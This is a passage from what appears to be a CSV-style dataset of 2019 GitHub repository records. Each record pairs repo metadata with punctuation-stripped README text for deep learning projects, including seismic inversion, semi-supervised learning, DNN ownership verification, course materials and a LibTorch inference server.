fullyconnected fullyconnected feed np oneslike out1 grads backward fullyconnected backward W b fullyconnected variables print W grads We can also construct the same layer by using following codes python from shinnosuke layers import Variable a Variable X the same as X in previous fullyconnected c Variable W getvalue the same value as W in previous fullyconnected d Variable b getvalue the same value as b in previous fullyconnected out2 a c d represents for matmul print out2 getvalue out2 grads np oneslike out2 getvalue specify gradients by using grad shinnosuke will automatically calculate the gradient from out2 to c c grad print c grads Guess what out1 has the same value of out2 and so did W and c s grads This is the magic autograd of shinnosuke By using this feature users can implement other networks as wishes without writing any backward codes See autograd example in Here https github com eLeVeNnN shinnosuke gpu blob master Examples autograd ipynb Installation Before installing Shinnosuke please install the following dependencies Numpy 1 15 0 recommend matplotlib 3 0 3 recommend Then you can install Shinnosuke by using pip pip install shinnosuke Installation from Github source will be supported in the future Supports Two basic class Layer Dense Conv2D MaxPooling2D MeanPooling2D Activation Input Dropout Batch Normalization Layer Normalization Group Normalization TimeDistributed SimpleRNN LSTM GRU waiting for implemented ZeroPadding2D Operations includes Add Minus Multiply Matmul and so on basic operations for Layer and Node Node Variable Constant Optimizers StochasticGradientDescent Momentum RMSprop AdaGrad AdaDelta Adam Waiting for implemented more Objectives MeanSquaredError MeanAbsoluteError BinaryCrossEntropy SparseCategoricalCrossEntropy CategoricalCrossEntropy Activations Relu Linear Sigmoid Tanh Softmax Initializations Zeros Ones Uniform LecunUniform GlorotUniform HeUniform Normal LecunNormal GlorotNormal HeNormal Orthogonal Regularizes waiting for implement Utils getbatches generate mini batch tocategorical convert inputs to one hot vector matrix concatenate concatenate Nodes that have the same shape in specify axis padsequences pad sequences to the same length Contact Email eleven1111 outlook com,2019-08-08T05:12:57Z,2019-11-26T01:52:45Z,Python,eLeVeNnN,User,2,18,0,25,master,eLeVeNnN,1,0,0,1,0,0,0
YangFangShu,FCNVMB-Deep-learning-based-seismic-velocity-model-building,deep-learning#deep-neural-networks#seismic-inversion#supervised-machine-learning#velocity-models,Deep learning inversion A next generation seismic velocity model building method This is the python implementation PyTorch of the deep leraning model for velocity model building in a surpervised approach The paper https library seg org doi 10 1190 geo2018 0249 1 is published on Geophysics The arxiv version of the paper is availabel here https arxiv org abs 1902 06267 Note that the arxiv version is a litlle different from the publishion please refer to the official version Abstract We investigate a novel method based on the supervised deep fully convolutional neural network FCN for velocity model building VMB directly from raw seismograms Unlike the conventional inversion method based on physical models the supervised deep learning methods are based on big data training rather than prior knowledge assumptions One key characteristic of the deep learning method is that it can automatically extract multi layer useful features without the need for human curated activities and initial velocity setup The data driven method usually requires more time during the training stage and actual predictions take less time with only seconds needed Therefore the computational time of geophysical inversions including real time inversions can be dramatically reduced once a good generalized network is built Experimental Results With the goal of estimating velocity models using seismic data as inputs directly the network needs to project seismic data from the data domain to the model domain Our method contains two stages the training process and the prediction process as shown in the following figure Flowchart of the FCN based inversion process images schematic png We design the CNN based on the famous U Net architecture https link springer com chapter 10 1007 978 3 319 24574 428 We extensively validate the proposed method on similate data and experimental data i e SEG salt model https wiki seg org wiki Opendata SEG 2FEAGESaltandOverthrustModels The following two figures show several visual resultes of our method compared with full waveform inversion FWI It denotes that our proposed method is generally feasible for velocity model building Comparisons of the velocity inversion simulated models images simulateresult png Comparisons of the velocity inversion SEG salt models images SEGresult png Dataset For the training process we generate the simulated velocity models and their corresponding measurement by solving the acoustic wave equation Since the storage of the data set is too large to share on website please don t be hesitate to contact the corresponding author to obtain the shared data associated with this research Training Testing The scripts FCNVMBtrain py and FCNVMBtest py are implemented for training and testing If you want to train your own network please firstly checkout the files named ParamConfig py and PathConfig py to be sure that all the parameters and the paths are consistent e g MAIN PARAMETERS SimulateData True If False denotes training the CNN with SEGSaltData ReUse False If False always re train a network DataDim 2000 301 Dimension of original one shot seismic data datadspblk 5 1 Downsampling ratio of input ModelDim 201 301 Dimension of one velocity model labeldspblk 1 1 Downsampling ratio of output dh 10 Space interval NETWORK PARAMETERS BatchSize 10 Number of batch size LearnRate 1e 3 Learning rate Nclasses 1 Number of output channels Inchannels 29 Number of input channels i e the number of shots SaveEpoch 20 DisplayStep 2 Number of steps till outputting stats and PATHS maindir home yfs1 Code pytorch FCNVMB Replace your main path here Check the main directory if len maindir 0 raise Exception Please specify path to correct directory Data path if os path exists data datadir maindir data Replace your data path here else os makedirs data datadir maindir data Define training testing data directory traindatadir datadir traindata Replace your training data path here testdatadir datadir testdata Replace your testing data path here Then checkout these two main files to train test the network simply type python FCNVMBtrain py python FCNVMBtest py Enviroment Requirement python 3 7 pytorch 1 0 numpy scipy matplotlib scikit image math All of them can be installed via conda anaconda e g conda install pytorch torchvision cudatoolkit 9 2 c pytorch Citation If you find the paper and the code useful in your research please cite the paper articleyang2019deep title Deep learning inversion A next generation seismic velocity model building method author Yang Fangshu and Ma Jianwei journal Geophysics volume 84 number 4 pages R583 R599 year 2019 publisher Society of Exploration Geophysicists If you have any questions about this paper feel free to contract us yfs2016 hit edu cn,2019-08-25T14:23:36Z,2019-12-12T03:21:47Z,Python,YangFangShu,User,2,17,8,39,master,YangFangShu,1,0,0,1,1,0,0
ucalyptus,EarthEngine-Deep-Learning,n/a,EarthEngine Deep Learning HitCount http hits dwyl io ucalyptus EarthEngine Deep Learning svg http hits dwyl io ucalyptus EarthEngine Deep Learning https raw githubusercontent com ucalyptus EarthEngine Deep Learning master Screenshot 20from 202019 09 26 2019 49 48 png View Slides http ucalyptus github io EarthEngine Deep Learning index slides html,2019-09-04T19:39:25Z,2019-11-25T20:18:47Z,HTML,ucalyptus,User,3,16,2,22,master,ucalyptus#ImgBotApp,2,0,0,0,0,0,1
ahmetius,LP-DeepSSL,n/a,LabelProp SSDL This repository contains the code for the following paper A Iscen G Tolias Y Avrithis O Chum Label Propagation for Deep Semi supervised Learning CVPR 2019 This code generally follows Mean Teacher Pytorch implementation https github com CuriousAI mean teacher tree master pytorch Python 3 and FAISS https github com facebookresearch faiss are required Data pre processing CIFAR 10 As in the original Mean Teacher repository run the following command data local bin preparecifar10 sh CIFAR 100 Run the similar command for CIFAR 100 taken from the fastswa semi sup https github com benathi fastswa semi sup tree master data local bin repository data local bin preparecifar100 sh Mini Imagenet We took the Mini Imagenet dataset hosted in this repository https github com gidariss FewShotWithoutForgetting and pre processed it Download train tar gz http ptak felk cvut cz personal toliageo share lpdeep train tar gz and test tar gz http ptak felk cvut cz personal toliageo share lpdeep test tar gz and extract them in the following directory data local images miniimagenet Running the experiments There are two stages to our method Stage 1 consists of training a network with known labels only Following command can be run to reproduce this experiment python trainstage1 py exclude unlabeled True num labeled NOLABELS gpu id GPUID label split SPLITID isMT False isL2 True dataset DATASET where NOLABELS is the number of labeled points GPUID is the GPU to be used 0 by default SPLITID is the ID of the split to be used 10 19 for cifar10 10 12 for cifar100 and miniimagenet DATASET is the name of the dataset cifar10 cifar100 or miniimagenet and LABELEDINBATCH is the number of labeled images in a batch 50 for cifar10 31 for cifar100 and miniimagenet After the training for Stage 1 is completed run the following command for Stage 2 which resumes the training from the model trained in Stage 1 but this time with pseudo labels using the entire dataset python trainstage2 py labeled batch size LABELEDINBATCH num labeled NOLABELS gpu id GPUID label split SPLITID isMT False isL2 True dataset DATASET Combining with Mean Teacher Use the following commands for combining Mean Teacher with our method Stage 1 python trainstage1 py labeled batch size LABELEDINBATCH num labeled NOLABELS gpu id GPUID label split SPLITID isMT True isL2 False dataset DATASET Stage 2 python trainstage2 py labeled batch size LABELEDINBATCH num labeled NOLABELS gpu id GPUID label split SPLITID isMT True isL2 False dataset DATASET,2019-08-18T15:44:57Z,2019-12-10T11:33:02Z,Shell,ahmetius,User,8,16,2,10,master,ahmetius,1,0,0,0,2,0,0
falloutdurham,beginners-pytorch-deep-learning,n/a,beginners pytorch deep learning Repository for scripts and notebooks from the book Beginners Guide to Using PyTorchfor Deep Learning,2019-08-12T23:24:05Z,2019-12-12T12:58:47Z,Jupyter Notebook,falloutdurham,User,3,15,15,8,master,falloutdurham,1,0,0,0,4,0,0
kamwoh,DeepIPR,n/a,Deep Network IPR Protection Project https kamwoh github io DeepIPR ArXiv https arxiv org abs 1909 07830 Official pytorch implementation of the paper Rethinking Deep Neural Network Ownership Verification Embedding Passports to Defeat Ambiguity Attacks NeurIPS 2019 Released on September 16 2019 Description With the rapid development of deep neural networks DNN there emerges an urgent need to protect the trained DNN models from being illegally copied redistributed or abused without respecting the intellectual properties of legitimate owners This work proposes novel passport based DNN ownership verification schemes which are both robust to network modifications and resilient to ambiguity attacks The gist of embedding digital passports is to design and train DNN models in a way such that the DNN model performance of an original task will be significantly deteriorated due to forged passports see Figure 1 In other words genuine passports are not only verified by looking for predefined signatures but also reasserted by the unyielding DNN model performances Figure 1 Example of ResNet performance on CIFAR10 when left Random Attack and right Ambiguity Attack How to run For compability issue please run the code using python 3 6 and pytorch 1 2 If you wish to use a real image as the passport please ensure that you have a pre trained model before training the passport layer To see more arguments please run the script with help The example below is running on default arguments To train a normal model without passport Skip train passport as follow python trainv1 py To train a V1 model scheme 1 passport Run train passport as follow python trainv1 py train passport pretrained path path to pretrained pth To train a V2 model scheme 2 passport Skip train private it is true by default python trainv23 py pretrained path path to pretrained pth To train a V3 model scheme 3 passport Run train backdoor as follow python trainv23 py train backdoor pretrained path path to pretrained pth Dataset Most of the datasets will be automatically downloaded except the trigger set data To download the default trigger set data kindly refer to https github com adiyoss WatermarkNN Also please refer to dataset py to understand how the data are loaded Attack passportattack1 py passportattack2 py and passportattack3 py are the scripts to run fake attack 1 2 and 3 respectively as mentioned in our paper Please refer to help on how to setup the arguments How to embed passport signature into a desired layer All passport configs are stored in passportconfigs To set a passport layer for Alexnet or ResNet18 simply changing false to true or a string If string is deployed as the signature please make sure that the length of the string is less than the number of channels in the specific layer For example a layer with 256 channels so the maximum will be 256 bit 32 ascii characters are allowed If the signature is less than 32 characters the remaining bits will be set randomly The example below is AlexNet with the last 3 layers as the passport layer i e we embed random signature into the 4th and 5th layer and embed this is my signature into the last layer 6th 0 false 2 false 4 true 5 true 6 this is my signature For passport in our experiments we randomly choose 20 images from the test data Passports in the intermediate layer will be the activation map of 20 images computed from pretrained model Citation If you find this work useful for your research please cite inproceedingsDeepassport title Rethinking Deep Neural Network Ownership Verification Embedding Passports to Defeat Ambiguity Attacks author Fan Lixin Ng Kam Woh and Chan Chee Seng booktitle Advances in Neural Information Processing Systems NeurIPS year 2019 Feedback Suggestions and opinions on this work both positive and negative are greatly welcomed Please contact the authors by sending an email to lixinfan at webank com or kamwoh at gmail com or cs chan at um edu my License and Copyright The project is open source under BSD 3 license see the LICENSE file 1692019 Webank and University of Malaya,2019-09-16T12:52:57Z,2019-12-09T10:10:34Z,Python,kamwoh,User,0,15,8,73,master,kamwoh#cs-chan,2,0,0,0,0,0,0
jcatanza,Fastai-Deep-Learning-From-the-Foundations-TWiML-Study-Group,audio#augmentation#batchnorm#callbacks#cnn#cyclegan-pytorch#deep-learning#deep-neural-networks#fastai-v3#mixup#nlp#optimizer#rnn#swift#tensorflow#ulmfit,TWiML Fastai Deep Learning From the Foundations Study Group This repo is to share annotated Jupyter notebooks lecture slide decks and other curriculum materials that I m creating for the TWiML Fastai Deep Learning From the Foundations Study Group aka Practical Deep Learning for Coders Part 2 Annotated or otherwise modified notebooks bear the suffix jcat ipynb The study group meets remotely via Zoom on Saturdays at 8 45 AM Pacific time from July 6 2019 through November 30 2019 We ll cover Lessons 8 12 of the course which are associated with the Python PyTorch Fastai library We will not cover lessons 13 and 14 which provide an introduction to the new Swift TensorFlow implementation of the Fastai library We communicate on the on the fastaidl channel of the TWiML Slack Group Our use of the Slack and Zoom platforms is by courtesy of Sam Charrington of TWiML This Week in Machine Learning An up to date schedule is maintained at https docs google com spreadsheets d 139XMd3moRb1C2No1XF5zN11Ivqm1XXXhEWNu2wcfTZc edit gid 339739437 Join the TWiML Fastai study group here https twimlai com twiml x fast ai Here is the key to optimizing your Fastai course experience BE MORE THAN A SPECTATOR Even if you intently watch and study all the videos unless you re also learning from the course notebooks by spending time with them running them and playing with them you are a spectator and you will miss out on getting the full benefit of the course I ve found that the primary barrier to participation in the Fastai courses is the task of setting up infrastructure to run the course notebooks There are many possible ways to accomplish the task If you have a computer with a GPU you can run the notebooks locally Otherwise you can run the notebooks on Kaggle on Google Colab or on other cloud platforms such as paperspace AWS and crestle Currently the best cloud alternative for most people is Google Colab which provides free access to CPUs GPUs and even TPUs Tensor Processing Units I have created a Jupyter notebook to guide you through the process of setting up to run the course notebooks on Google Colab you can run it directly from this repo via the URL https colab research google com github jcatanza Fastai Deep Learning From the Foundations TWiML Study Group blob master initializefastaidl2colabjcat ipynb If you plan to participate in the course please set up infrastruture to run the notebooks as a first priority Hope to see you at the next meetup,2019-08-08T00:39:45Z,2019-12-07T16:27:09Z,Jupyter Notebook,jcatanza,User,5,15,4,69,master,jcatanza,1,0,0,0,0,0,0
jkoutsikakis,pytorch-wrapper,data-science#deep-learning#machine-learning#neural-network#python#pytorch#pytorch-wrapper#tensor,PyTorchWrapper PyTorchWrapper is a library that provides a systematic and extensible way to build train evaluate and tune deep learning models using PyTorch It also provides several ready to use modules and functions for fast model development Installation From PyPI bash pip install pytorch wrapper From Source bash git clone https github com jkoutsikakis pytorch wrapper git cd pytorch wrapper pip install Docs Examples The docs can be found here https pytorch wrapper readthedocs io en latest There are also the following examples in notebook format 1 Two Spiral Task examples 1twospiraltask ipynb 2 Image Classification Task examples 2imageclassificationtask ipynb 3 Tuning Image Classifier examples 3tuningimageclassifier ipynb 4 Text Classification Task examples 4textclassificationtask ipynb 5 Sequence Classification Task examples 5sequenceclassificationtask ipynb 6 Custom Callback examples 6customcallback ipynb 7 Custom Loss Wrapper examples 7customlosswrapper ipynb 8 Custom Evaluator examples 8customevaluator ipynb,2019-08-11T11:06:32Z,2019-12-12T15:06:38Z,Python,jkoutsikakis,User,3,15,5,10,master,jkoutsikakis,1,5,5,0,0,0,0
jiazhihao,sosp19ae,n/a,Artifacts for SOSP 19 paper Optimizing Deep Learning Computation with Automatic Generation of Graph Substitutions,2019-08-14T19:01:32Z,2019-12-06T14:47:42Z,C++,jiazhihao,User,2,15,3,25,master,jiazhihao#odedp,2,1,1,0,1,0,0
che-shr-cat,deep-learning-for-biology-hse-2019-course,n/a,Deep Learning for Biology course materials HSE 2019 This is a repository of course materials for the Deep Learning for Biology course The course is taught Fall 2019 at Higher School of Economics Moscow Faculty of Computer Science Masters Programme Data Analysis in Biology and Medicine The contents Course slides slides Course Jupyter notebooks notebooks using Tensorflow 2 0 Later in the course we switched to Colab notebooks You can download them if you want Syllabus 10 09 2019 1 Artificial Intelligence Current state and Overview Topics Short history Current results in Deep Learning Images and Video Speech and Sound Text and Language Robotic control ML for systems Problems with DL Other approaches to AI Knowledge and Representation Symbolic approaches Evolutionary computations and Swarm intelligence Hardware Slides pdf slides 231 20 D0 98 D1 81 D0 BA D1 83 D1 81 D1 81 D1 82 D0 B2 D0 B5 D0 BD D0 BD D1 8B D0 B9 20 D0 B8 D0 BD D1 82 D0 B5 D0 BB D0 BB D0 B5 D0 BA D1 82 2C 20 D0 BE D0 B1 D0 B7 D0 BE D1 80 20 D0 BE D0 B1 D0 BB D0 B0 D1 81 D1 82 D0 B8 pdf Video part 1 https www youtube com watch v 4lJJXigY part 2 https www youtube com watch v 78 eNtdGd28 part 3 https www youtube com watch v h3u1rEwo 17 09 2019 2 Introduction to Neural Networks Topics Intro into NN neuron neural network backpropagation Feed forward NNs FNN Autoencoders AE Slides pdf slides 232 20 D0 92 D0 B2 D0 B5 D0 B4 D0 B5 D0 BD D0 B8 D0 B5 20 D0 B2 20 D0 BD D0 B5 D0 B9 D1 80 D0 BE D1 81 D0 B5 D1 82 D0 B8 pdf Video part 1 https www youtube com watch v tAeNQfvPDvI including the last topic from previous lecture the Hardware part 2 https www youtube com watch v x5D2eKDFALM 24 09 2019 3 Tensorflow 2 Keras practice Code Tensorflow 2 Intro FFN Binary classification Multi class classification Regression Jupyter notebook notebooks 1 20 20tf2nnintro ipynb Colab notebook https colab research google com drive 1YVrUhphhLCoTY aNCJGJLlXmeJWd62 Autoencoders shallow deep regularized sparse denoising Jupyter notebook notebooks 2 20 20tf2autoencoders ipynb Colab notebook https colab research google com drive 1sWx65xJJTPxg2HnbwVjKj3YdNSXYQRy Video part 1 https www youtube com watch v AkTG7U2Wsxs part 2 https www youtube com watch v 1v9OtgmrakM alternative recording https youtu be 32O0rQth0WE 01 10 2019 4 Convolutional NNs CNN and Image processing Topics What is CNN Code CNN for classification CNN autoencoders Saving and Loading models How to use pretrained models in Tensorflow Jupyter notebook notebooks 4 20 20tf2cnn ipynb Colab notebook https colab research google com drive 1vu ZUHCVzPnvhohcPsPD96p4K5VcAVke Slides pdf slides 234 20Convolutional 20Neural 20Networks 20 CNNs pdf Video part 1 https youtu be 6mgm2sDoHIQ other parts are missing 08 10 2019 5 Real life modern CNNs Topics Activations Regularization Augmentation Optimization etc Models LeNet AlexNet VGG GoogLeNet Inception ResNet DenseNet XCeption NASNet Slides pdf slides 235 20 D0 9A D0 B0 D0 BA 20 D1 83 D1 81 D1 82 D1 80 D0 BE D0 B5 D0 BD D1 8B 20 D1 80 D0 B5 D0 B0 D0 BB D1 8C D0 BD D1 8B D0 B5 20 D1 81 D0 BE D0 B2 D1 80 D0 B5 D0 BC D0 B5 D0 BD D0 BD D1 8B D0 B5 20 D0 BC D0 BE D0 B4 D0 B5 D0 BB D0 B8 pdf Video video 1 75 https www youtube com watch v aWnrBejs79I waiting for other recordings 15 10 2019 Journal Club 1 Video video https www youtube com watch v ZXrlG742sT0 29 10 2019 Journal Club 2 Video video https www youtube com watch v Ze1QUAeYz k 05 11 2019 6 Guest Lecture Artur Kadurin GANs Slides pdf slides 236 20ArturKadurin 20 20GANs pdf Video video https youtu be K7qIkl0eJPM 12 11 2019 7 Transfer Learning Topics Theory of Transfer Learning Code How to use pretrained models in Tensorflow Colab notebook using Keras https colab research google com github tensorflow docs blob master site en tutorials images transferlearning ipynb Colab notebook using TFHub https www tensorflow org tutorials images transferlearningwithhub Slides pdf slides 237 20Transfer 20Learning pdf Video video first half https youtu be jAhoqRv3UQw 12 11 2019 8 Advanced CNNs Topics 1D 3D dilated convolutions Detection R CNN Fast R CNN Faster R CNN YOLO Fully convolutional CNNs FCNs Deconvolutional networks Transposed convolution Generative Adversarial Networks GANs Style Transfer Code Variational autoencoder Jupyter notebook notebooks 3 20 20tf2vae ipynb Colab notebook https colab research google com drive 1rgUVgs7YnluhwaNDfDb6vGjXElb5QXn8 Slides pdf slides 238 20 D0 9F D1 80 D0 BE D0 B4 D0 B2 D0 B8 D0 BD D1 83 D1 82 D1 8B D0 B5 20 D1 81 D0 B2 D1 91 D1 80 D1 82 D0 BE D1 87 D0 BD D1 8B D0 B5 20 D1 81 D0 B5 D1 82 D0 B8 pdf Video video second half https youtu be jAhoqRv3UQw 19 11 2019 9 Recurrent NNs RNNs Topics RNN basics Backpropagation through time Long short term memory LSTM Code Generating text using RNNs Colab notebook https colab research google com github tensorflow docs blob master site en tutorials text textgeneration ipynb Time series forecasting Colab notebook https colab research google com github tensorflow docs blob master site en tutorials structureddata timeseries ipynb Slides pdf slides 239 20 D0 9E D1 81 D0 BD D0 BE D0 B2 D1 8B 20 D1 80 D0 B5 D0 BA D1 83 D1 80 D1 80 D0 B5 D0 BD D1 82 D0 BD D1 8B D1 85 20 D1 81 D0 B5 D1 82 D0 B5 D0 B9 pdf Video video https www youtube com watch v 9e xekZsxx4 26 11 2019 10 Working with texts using RNNs Topics Advanced RNNs Bidirectional RNNs Multidimensional RNNs Working with texts vectorizing one hot encoding word embeddings word2vec BPE etc Code Building text classifiers LSTM Deep LSTM Bidirectional LSTM 1D CNN CNN LSTM Colab notebook https colab research google com drive 1uejcFOkuzzp97P pwzICrWxrLJoTNpRv Slides pdf slides 2310 20 20 20 20c 20 20RNN pdf Video video https www youtube com watch v vt7Dno4MPck 03 12 2019 Journal Club 3 Video video https youtu be 9p3BtTfMyow 10 12 2019 11 Sequence Learning seq2seq Topics Multimodal Learning Seq2seq Encoder Decoder Beam search Attention mechanisms Visualizing attention Hard and Soft attention Self Attention Augmented RNNs Connectionist Temporal Classification CTC Non RNN Sequence Learning problems with RNNs Convolutional Sequence Learning Slides pdf slides 2311 20Sequence 20Learning pdf Video video https www youtube com watch v C7T9NabB2UI 17 12 2019 12 Transformers Topics Self Attention Neural Networks SAN Transformer Architecture Transformer The next steps Image Transformer Universal Transformer Transformer XL BERT Co RoBERTa XLNet ALBERT etc GPT 2 etc Slides pdf slides 2312 20Transformers pdf pptx with a couple of animations slides 2312 20Transformers pptx Code Colab notebook transformers https colab research google com drive 19G8bJhnA58pCjQzEsagUHvMn1UgHqY3 Video video https www youtube com watch v uPaL78BcY Need to be updated for TF 2 0 and other libraries Keras practice Notebook Visualizing CNNs Saliency maps grad CAM FCNs notebooks kerascnn ipynb Keras practice Notebook Playing with autoencoders notebooks playingwithautoencoders ipynb Notebook FCN example classification using only convolutions notebooks kerascnn ipynb,2019-09-18T14:01:31Z,2019-12-10T14:45:46Z,Jupyter Notebook,che-shr-cat,User,6,14,17,62,master,che-shr-cat,1,0,0,0,0,0,0
QuantScientist,DarkTorch,cmake#cpp11#docker#gpu#inference#inference-server#libtorch#nvidia-gpus#pytorch#pytorch-models,DarkTorch Work In Progress A docker based low latency deep learning library and inference server written in C 11 using the PyTorch C frontend https pytorch org cppdocs frontend html Above all this project is a step by step tutorial for building production grade AI systems in Libtorch C What is it all about There is no better way of depicting the usefulness of DarkTorch by viewing several demos A C demo of running inference on a traced PyTorch Resnet34 CNN model using a tqdm like callback resnet34 assets resnet34 gif Introduction darktorch logo assets darktorch logo jpg This repository implements a low latency deep learning inference LIBRARY and server using pytorch C frontend The DarkTorch service is a C application running a HTTP server with a REST API This service is able to run inference on multiple deep learning models in parallel on all the available GPU processors to obtain the results in the shortest time possible Performance In progress The inference speed is benchmarked on a single NVIDIA Tesla P 100 GPU gpu assets gpu jpg Architecture Threads Batch Size Inference Speed FPS Checkpoint ResNet9 C https github com lambdal cifar10 fast11 BaiduNet8 C https github com BAIDU USA GAIT LEOPARD CIFAR10 Inference BaiduNet811 Yolo v3 C https github com walktree libtorch yolov311 Mask RCNN C https github com lsrock1 maskrcnnbenchmark cpp11 Table of contents Technologies Technologies Building Building Testing Testing Contributors contributors torch jit script Module module torch jit load smodelname torch kCUDA Technologies This projects makes use of several technologies C 11 welll cpp include include include include etc etc Docker https www docker com for bundling all the dependencies of our program and for easier deployment We inherit from FROM nvcr io nvidia pytorch 19 02 py3 RUN apt get update apt get install y sudo git bash ENV PATH usr local nvidia bin usr local cuda bin code cmake 3 14 3 Linux x8664 bin PATH ENV PYTHONPATH opt conda lib python3 6 site packages PYTHONPATH ENV LDLIBRARYPATH LDLIBRARYPATH opt conda lib opt conda lib python3 6 The whole docker file is availabe here Libtorch https pytorch org because it has good performance and a simple C API Torch has now two versions Pre cxx11 ABI https download pytorch org libtorch cu100 libtorch shared with deps 1 2 0 zip cxx11 ABI compiled with GLIBCXXUSECXX11ABI 1 https download pytorch org libtorch cu100 libtorch cxx11 abi shared with deps 1 2 0 zip OpenCV http opencv org to have a simple C API for GPU image processing CMake https cmake org refer to the sample C applications Sample CMakeLists txt file is available here cpp cmakeminimumrequired VERSION 3 5 FATALERROR project FeatureEx VERSION 1 2 3 4 LANGUAGES CXX set PROJECTNAME FeatureEx if NOT DEFINED CMAKECXXSTANDARD SET CMAKECXXSTANDARD 11 SET CMAKECXXSTANDARDREQUIRED ON set CMAKEVERBOSEMAKEFILE ON endif if CMAKECXXSTANDARD LESS 11 message FATALERROR CMAKECXXSTANDARD is less than 11 endif set CMAKEBUILDTYPE Release set CXXRELEASEFLAGS O3 march native Building Prerequisites A Kepler or Maxwell NVIDIA GPU with at least 8 GB of memory A Linux host system with recent NVIDIA drivers recommended 415 Install nvidia docker2 https github com NVIDIA nvidia docker wiki Installation version 2 0 Build command The command might take a while to execute bash sudo docker build t cuda10 trt cuda10 trt Testing Start the docker container bash sudo nvidia docker run it shm size 4g env DISPLAY volume HOME Xauthority root Xauthority rw v tmp X11 unix tmp X11 unix rw p 8097 8097 p 3122 22 p 7842 7842 p 8787 8787 p 8786 8786 p 8788 8788 p 8888 8888 p 5000 5000 v dev root sharedfolder v dev torch models root cache torch checkpoints cuda10 trt bash We assume that the PyTorch models are mapped externally to docker via the v command and reside here dev torch models You can ammend that path to reflect the settings in your environment Starting the server Execute the following command and wait a few seconds for the initialization of the classifiers Single image Classifiation Tested CNN models ResNet9 ResNet18 BaiduNet8 Yolo v3 C Environment The code is developed under the following configurations Hardware 1 GPU for testing Software Ubuntu 16 04 3 LTS CUDA 10 0 Python 3 6 PyTorch 1 2 0 Dependencies refer to the docker file Benchmarking performance We can benchmark the performance of our inference server using any tool that can generate HTTP load We included a Dockerfile for a benchmarking client using rakyll hey https github com rakyll hey Contributing Feel free to report issues during build or execution We also welcome suggestions to improve the performance of this application Author Shlomo Kashani Head of AI at DeepOncology AI Kaggle Expert Founder of Tel Aviv Deep Learning Bootcamp shlomo deeponcology ai Citation If you find the code or trained models useful please consider citing miscDarkTorch2019 author Kashani Shlomo title DarkTorch2019 howpublished urlhttps github com QuantScientist DarkTorch year 2019 References https www jianshu com p 6fe9214431c6 https github com lsrock1 maskrcnnbenchmark cpp https github com BAIDU USA GAIT LEOPARD CIFAR10 Training BaiduNet9 https github com BAIDU USA GAIT LEOPARD CIFAR10 Inference BaiduNet8 https github com BIGBALLON PyTorch CPP https gist github com Con Mi 4d92af62adb784a5353ff7cf19d6d099 https lernapparat de pytorch traceable differentiable http lernapparat de static artikel pytorch jit android thomasviehmann pytorchjitandroid2018 12 11 pdf https github com walktree libtorch yolov3,2019-08-24T07:58:19Z,2019-12-03T08:57:07Z,C++,QuantScientist,User,4,14,0,70,master,QuantScientist,1,0,0,0,0,0,0
BobaZooba,HSE-Deep-Learning-in-NLP-Course,n/a,HSE Deep Learning in NLP Course https t me hsedlnlp https t me joinchat Bp0V0UPTLBJHv3o7XiBFaA https youtu be TLauwjPkbS0 MLP https github com BobaZooba HSE Deep Learning in NLP Course blob master week01 LogReg 20vs 20MLP ipynb https github com BobaZooba HSE Deep Learning in NLP Course blob master week01 derivatives ipynb https github com BobaZooba HSE Deep Learning in NLP Course blob master week01 neuralnetwork numpy 20MNIST ipynb https github com BobaZooba HSE Deep Learning in NLP Course blob master week02 1 1 20Processing 20corpus ipynb RNN LSTM Bidirectional https github com BobaZooba HSE Deep Learning in NLP Course blob master week03 modeling py https github com BobaZooba HSE Deep Learning in NLP Course blob master week03 Implementation 20test ipynb Attention from scratch https github com BobaZooba HSE Deep Learning in NLP Course blob master week05 Attention 20from 20scratch ipynb PyTorch CIFAR 10 DMIA https github com BobaZooba HSE Deep Learning in NLP Course blob master week06 Hello 20CIFAR 2010 ipynb numpy PyTorch DMIA https github com BobaZooba HSE Deep Learning in NLP Course blob master week06 Hello 20PyTorch ipynb Syllabus Lecture 1 Neural Networks https youtu be jEMdv9fW2ZA https youtu be tZ0yCzWfbZc Neural Networks https github com BobaZooba HSE Deep Learning in NLP Course blob master week01 Week 2001 pdf nlayer neural network https github com BobaZooba HSE Deep Learning in NLP Course blob master week01 neuralnetwork Homework 201 1 ipynb 10 30 09 2019 23 59 Lecture 2 Word Embeddings https www youtube com watch v xjJF5NHFBAY feature youtu be https www youtube com watch v UkEFhFtzgAI feature youtu be Word Embeddings https github com BobaZooba HSE Deep Learning in NLP Course blob master week02 Week 2002 pdf word2vec https github com BobaZooba HSE Deep Learning in NLP Course blob master week02 1 2 20word2vec ipynb 10 07 10 2019 23 59 Lecture 3 Tricks in Deep Learning Recurrent Neural Networks Convolutional Neural Networks https youtu be Uz5z0NLi70w https youtu be L0jfQn6SjI https youtu be yF7bDSmfyII Tricks in Deep Learning https github com BobaZooba HSE Deep Learning in NLP Course blob master week03 Tricks 20in 20DL pdf Recurrent Neural Networks https github com BobaZooba HSE Deep Learning in NLP Course blob master week03 RNN pdf Convolutional Neural Networks https github com BobaZooba HSE Deep Learning in NLP Course blob master week03 CNN pdf Lecture 4 Language Models https youtu be VSYG xMG94U https youtu be 9WnUSoyBzfs Language Models https github com BobaZooba HSE Deep Learning in NLP Course blob master week04 Language 20Models pdf Lecture 5 Sequence2Sequence Attention https youtu be LOH3hx8skMU https youtu be UEucWY2v2M https youtu be mWZ2FvYmSco Transformer https github com BobaZooba HSE Deep Learning in NLP Course blob master week05 Transformer pdf classification https github com BobaZooba HSE Deep Learning in NLP Course blob master week05 Classification 20Subsample 20Mail ipynb 10 24 10 2019 23 59 Lecture 6 GPT BERT Metric Learning https www youtube com watch v kizuKRzG2Rs https www youtube com watch v gMBSPvTg0Gg https www youtube com watch v Wxi8cupTx9Q https www youtube com watch v klOSrqiCE8g BERT https github com BobaZooba HSE Deep Learning in NLP Course blob master week06 BERT pdf kaggle https www kaggle com c deepnlp hse course overview mail ru https otvet mail ru maincategory 28 mail ru group transfer learning data augmentation metric learning pseudo labeling multitask learning 14 12 2019 21 12 2019 16 11 2019 23 59 http web stanford edu class cs224n project html 4 Google https docs google com spreadsheets d 19iCgKFiYUUQLWhz UxN97hUZ8xNvMcDdSle5Zm0U edit usp sharing NER B LOC O O O BIO Papers With Code the latest in machine learning https paperswithcode com nlpprogress http nlpprogress com 1 Dataset Search https toolbox google com datasetsearch Papers With Code the latest in machine learning https paperswithcode com tf idf log reg roadmap Roadmap FAQ Q A Q 0 A Q A Papers With Code the latest in machine learning https paperswithcode com bobazooba yandex ru mailto bobazooba yandex ru telegram bobazooba https t me bobazooba,2019-09-08T07:28:19Z,2019-11-18T11:19:11Z,Jupyter 